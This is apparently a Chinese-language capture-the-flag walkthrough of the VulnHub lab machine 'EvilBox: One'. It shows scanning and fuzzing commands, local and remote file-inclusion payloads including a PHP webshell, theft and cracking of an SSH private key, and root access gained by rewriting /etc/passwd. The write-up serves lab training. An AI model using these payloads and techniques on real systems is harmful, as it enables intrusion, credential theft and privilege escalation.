靶机地址：[EvilBox: One ~ VulnHub](https://www.vulnhub.com/entry/evilbox-one,736/)
主机发现、端口扫描、服务枚举
```Shell
sudo arp-scan -l
# 或
sudo fping -gaq 192.168.1.1/24
# q键退出
sudo nmap -p- 192.168.1.21
sudo nmap -p22,80 -sV 192.168.1.21
# 22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
# 80/tcp open  http    Apache httpd 2.4.38 ((Debian))
# -A 参数包括-sV 和 其它脚本 结果更详细
sudo nmap -p22,80 -A 192.168.1.21
```
访问Web服务，没啥特别的
Web路径枚举
```Shell
sudo dirsearch -u http://192.168.1.21
# [10:10:26] 200 -   10KB - /index.html
# [10:10:32] 200 -   12B  - /robots.txt
# [10:10:33] 200 -    4B  - /secret/
sudo feroxbuster --url http://192.168.1.21
gobuster dir -u http://192.168.1.21 -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x php,jsp,html,js,txt
```
访问 `/robots.txt` ，内容如下
```
Hello H4x0r
```
试了一下没啥用，再对 `/secret/` 进行路径扫描
```Shell
sudo dirsearch -u http://192.168.1.21/secret/
# 只发现一个index.html
sudo feroxbuster --url http://192.168.1.21/secret/
# 啥都没发现
sudo gobuster dir -u http://192.168.1.21/secret/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x php,jsp,html,js,txt
# index.html evil.php
```
似乎只有 `evil.php` 可以利用，需要对其进行参数爆破
可以使用BurpSuite的Intruder，这里使用 `ffuf` ，变量名使用 `seclists` 里的Burp专业版的字典，值使用手动的字典先试试 `v.txt`
```
1
2
3
a
b
c
'
"
(
<
,
;
?
/
%
```
暴破一下试试
```Shell
# -w 指定字典 :多个字典命名区分 -u URL -fs 过滤响应长度为0的
sudo ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM -w v.txt:VALUE -u http://192.168.1.21/secret/evil.php?PARAM=VALUE -fs 0
```
失败了，尝试一些更可能的参数值
```Shell
sudo ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.1.21/secret/evil.php?FUZZ=../index.html -fs 0
```
发现一个参数：`command` ，
访问 `http://192.168.1.21/secret/evil.php?command=../index.html` ，可能存在文件包含漏洞。再尝试读取其它文件
```
http://192.168.1.21/secret/evil.php?command=../../../../etc/passwd
```
成功读取到了，确实存在目录穿越和文件包含
接下来尝试远程文件包含和PHP包装器
先尝试远程文件包含
```Shell
nc -lp 4444
```
尝试访问
```
http://192.168.1.21/secret/evil.php?command=http://192.168.1.26:4444/exp.php
```
失败了，并没有收到连接请求，可能不存在远程文件包含
再尝试直接使用PHP包装器直接执行负载
```
http://192.168.1.21/secret/evil.php?command=data:text/plain,<?php echo shell_exec("id") ?>
```
还是失败了，再尝试读取源码，使用base64的好处是不会直接执行代码
```
http://192.168.1.21/secret/evil.php?command=php://filter/convert.base64-encode/resource=evil.php
```
得到如下内容
```
PD9waHAKICAgICRmaWxlbmFtZSA9ICRfR0VUWydjb21tYW5kJ107CiAgICBpbmNsdWRlKCRmaWxlbmFtZSk7Cj8+Cg==
```
解码后为
```php
<?php
    $filename = $_GET['command'];
    include($filename);
?>
```
尝试写入文件，内容如下
```php
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
```
对其进行base64编码
```
PD9waHAgZWNobyAnPHByZT4nIC4gc2hlbGxfZXhlYygkX0dFVFsnY21kJ10pIC4gJzwvcHJlPic7Pz4=
```
尝试写入，写入的内容是经过base64编码过的，这里的MTIz解码后就是123
```
http://192.168.1.21/secret/evil.php?command=php://filter/write=convert.base64-decode/resource=test.txt&txt=MTIz
```
写入失败了。
这样的话我们只有读的权限，回到之前目录穿越时获取的信息
```
root:x:0:0:root:/root:/bin/bash
mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
```
尝试SSH远程连接
```Shell
ssh mowree@192.168.1.21 -v
# 输出中包含这样一行
# debug1: Authentications that can continue: publickey,password
```
说明可以通过公钥连接，尝试直接读取密钥
```
http://192.168.1.21/secret/evil.php?command=../../../../home/mowree/.ssh/authorized_keys
```
获取到已经通过认证的公钥
```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAXfEfC22Bpq40UDZ8QXeuQa6EVJPmW6BjB4Ud/knShqQ86qCUatKaNlMfdpzKaagEBtlVUYwit68VH5xHV/QIcAzWi+FNw0SB2KTYvS514pkYj2mqrONdu1LQLvgXIqbmV7MPyE2AsGoQrOftpLKLJ8JToaIUCgYsVPHvs9Jy3fka+qLRHb0HjekPOuMiq19OeBeuGViaqILY+w9h19ebZelN8fJKW3mX4mkpM7eH4C46J0cmbK3ztkZuQ9e8Z14yAhcehde+sEHFKVcPS0WkHl61aTQoH/XTky8dHatCUucUATnwjDvUMgrVZ5cTjr4Q4YSvSRSIgpDP2lNNs1B7 mowree@EvilBoxOne
```
再尝试获取目标机器上的私钥
```
http://192.168.1.21/secret/evil.php?command=../../../../home/mowree/.ssh/id_rsa
```
成功获取到私钥
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E

uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6
hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe
o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb
+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot
b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k
HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg
9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY
zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu
rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1
tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs
94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm
VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7
Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P
hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr
Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR
IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R
MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS
62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69
Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8
p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C
pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X
KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa
i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp
4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/
8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==
-----END RSA PRIVATE KEY-----
```
将私钥写到文件 `id_rsa` 中，并赋予响应权限
```Shell
chmod 600 id_rsa
```
尝试直接通过私钥连接
```Shell
ssh mowree@192.168.1.21 -i id_rsa
```
需要输入密码，随便输几个都失败了
尝试暴破，先找一个字典
```Shell
cp /usr/share/wordlists/rockyou.txt.gz .
gunzip rockyou.txt.gz
```
破解
```Shell
# 格式转换成john可以使用的
python /usr/share/john/ssh2john.py id_rsa > id_rsa.john
# 破解
john id_rsa.john --wordlist=rockyou.txt
```
结果为 `unicorn` 。
再次尝试连接
```Shell
ssh mowree@192.168.1.21 -i id_rsa
```
输入密码后成功连接。
获取第一个flag
```Shell
ls -l
cat user.txt
```
尝试提权
```Shell
sudo -l
# -bash: sudo: orden no encontrada
# 没有不当的配置
find / -perm -u=s -type f -user root -executable ! -group root 2>/dev/null -exec ls -l {} \;
# 没找到可以利用的SUID文件
uname -a
# Linux EvilBoxOne 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64 GNU/Linux
# 也没找到合适的内核漏洞利用
```
但是当前账号居然对 `/etc/passwd` 有写权限，其中的密码是hash，不能直接用字符串
先生成一个密码密文
```Shell
openssl passwd -1
```
输入两次相同的任意密码
将生成的字符替换到 `/etc/passwd` 中 `root` 用户当前的占位密码 `x`
```Shell
su
# 输入替换后的密码明文
```
成功提权

